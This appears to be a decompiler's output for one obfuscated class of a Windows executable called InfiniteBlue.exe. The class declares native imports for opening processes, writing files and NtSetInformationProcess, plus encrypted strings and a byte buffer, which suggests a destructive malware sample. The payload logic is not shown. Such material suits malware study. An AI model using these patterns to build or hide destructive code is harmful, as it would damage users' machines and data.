// Decompiled with JetBrains decompiler
// Type: A.
// Assembly: InfiniteBlue, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 75787C59-6E69-48EC-8991-CFBDA71A3167
// Assembly location: C:\Users\adriel\Downloads\InfiniteBlue.exe

using System;
using System.Media;
using System.Runtime.InteropServices;

#nullable disable
namespace A;

internal static class \u001E
{
  private static A.\u0012 \u001D = new A.\u0012();
  private static \u0020 \u001D = new \u0020();
  private static \u0009 \u001D = new \u0009();
  private static \u0013 \u001D = new \u0013();
  private static A.\u0008 \u001D = new A.\u0008();
  private static \u0019 \u001D = new \u0019();
  private static \u0015 \u001D = new \u0015();
  private static A.\u0010 \u001D = new A.\u0010();
  private static SoundPlayer \u001D;
  public static string \u001D = Environment.GetFolderPath((Environment.SpecialFolder) \u001D\u0012.\u001D(1316)) + \u0017.\u001D(1562);
  private static byte[] \u001D = new byte[\u001D\u0012.\u001D(1320)];

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
  private static extern bool \u001D(IntPtr _param0);

  [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
  private static extern IntPtr \u001D(\u001E.\u001F _param0, bool _param1, int _param2);

  [DllImport("kernel32.dll", EntryPoint = "CreateFile", CharSet = CharSet.Auto)]
  private static extern IntPtr \u001D(
    string _param0,
    \u001E.\u0018 _param1,
    \u001E.\u000D _param2,
    IntPtr _param3,
    \u001E.\u000E _param4,
    \u001E.\u0016 _param5,
    IntPtr _param6);

  [DllImport("kernel32.dll", EntryPoint = "WriteFile")]
  private static extern bool \u001D(
    IntPtr _param0,
    byte[] _param1,
    uint _param2,
    out uint _param3,
    [In] IntPtr _param4);

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess")]
  private static extern int \u001D(IntPtr _param0, int _param1, ref int _param2, int _param3);

  [STAThread]
  private static void \u001D() => \u0003\u0012.\u001D();

  public static void \u0012() => \u001C\u0012.\u001D();

  private static void \u0010() => \u0007\u0012.\u001D();

  private static void \u000A() => \u0004\u0012.\u001D();

  private static void \u001A() => \u000C\u0012.\u001D();

  public static void \u000B() => \u0017\u0012.\u001D();

  private static void \u0008() => \u001D\u0010.\u001D();

  [Flags]
  public enum \u001F : uint
  {
    \u001D = 2035711, // 0x001F0FFF
    \u0012 = 1,
    \u0010 = 2,
    \u000A = 8,
    \u001A = 16, // 0x00000010
    \u000B = 32, // 0x00000020
    \u0008 = 64, // 0x00000040
    \u0019 = 128, // 0x00000080
    \u0009 = 256, // 0x00000100
    \u0020 = 512, // 0x00000200
    \u0015 = 1024, // 0x00000400
    \u0005 = 4096, // 0x00001000
    \u001F = 1048576, // 0x00100000
  }

  [Flags]
  private enum \u0018 : uint
  {
    \u001D = 16777216, // 0x01000000
    \u0012 = 33554432, // 0x02000000
    \u0010 = 65536, // 0x00010000
    \u000A = 131072, // 0x00020000
    \u001A = 262144, // 0x00040000
    \u000B = 524288, // 0x00080000
    \u0008 = 1048576, // 0x00100000
    \u0019 = \u000B | \u001A | \u000A | \u0010, // 0x000F0000
    \u0009 = \u000A, // 0x00020000
    \u0020 = \u0009, // 0x00020000
    \u0015 = \u0020, // 0x00020000
    \u0005 = \u0015 | \u0008 | \u000B | \u001A | \u0010, // 0x001F0000
    \u001F = 65535, // 0x0000FFFF
    \u0018 = 1,
    \u000D = \u0018, // 0x00000001
    \u000E = 2,
    \u0016 = \u000E, // 0x00000002
    \u001E = 4,
    \u0011 = \u001E, // 0x00000004
    \u0013 = \u0011, // 0x00000004
    \u0006 = 8,
    \u0002 = 16, // 0x00000010
    \u0001 = 32, // 0x00000020
    \u000F = \u0001, // 0x00000020
    \u001B = 64, // 0x00000040
    \u0014 = 128, // 0x00000080
    \u0003 = 256, // 0x00000100
    \u001C = 2147483648, // 0x80000000
    \u0007 = 1073741824, // 0x40000000
    \u0004 = 536870912, // 0x20000000
    \u000C = 268435456, // 0x10000000
    \u0017 = 65535, // 0x0000FFFF
    \u001D\u0012 = \u0003 | \u0014 | \u001B | \u000F | \u0002 | \u0006 | \u0013 | \u0016 | \u000D | \u0005, // 0x001F01FF
    \u0012\u0012 = \u0014 | \u0006 | \u000D | \u0015 | \u0008, // 0x00120089
    \u0010\u0012 = \u0003 | \u0002 | \u0013 | \u0016 | \u0015 | \u0008, // 0x00120116
    \u000A\u0012 = \u0014 | \u000F | \u0015 | \u0008, // 0x001200A0
  }

  [Flags]
  public enum \u000D : uint
  {
    \u001D = 0,
    \u0012 = 1,
    \u0010 = 2,
    \u000A = 4,
  }

  public enum \u000E : uint
  {
    \u001D = 1,
    \u0012 = 2,
    \u0010 = 3,
    \u000A = 4,
    \u001A = 5,
  }

  [Flags]
  public enum \u0016 : uint
  {
    \u001D = 1,
    \u0012 = 2,
    \u0010 = 4,
    \u000A = 16, // 0x00000010
    \u001A = 32, // 0x00000020
    \u000B = 64, // 0x00000040
    \u0008 = 128, // 0x00000080
    \u0019 = 256, // 0x00000100
    \u0009 = 512, // 0x00000200
    \u0020 = 1024, // 0x00000400
    \u0015 = 2048, // 0x00000800
    \u0005 = 4096, // 0x00001000
    \u001F = 8192, // 0x00002000
    \u0018 = 16384, // 0x00004000
    \u000D = 2147483648, // 0x80000000
    \u000E = 1073741824, // 0x40000000
    \u0016 = 536870912, // 0x20000000
    \u001E = 268435456, // 0x10000000
    \u0011 = 134217728, // 0x08000000
    \u0013 = 67108864, // 0x04000000
    \u0006 = 33554432, // 0x02000000
    \u0002 = 16777216, // 0x01000000
    \u0001 = 2097152, // 0x00200000
    \u000F = 1048576, // 0x00100000
    \u001B = 524288, // 0x00080000
  }
}
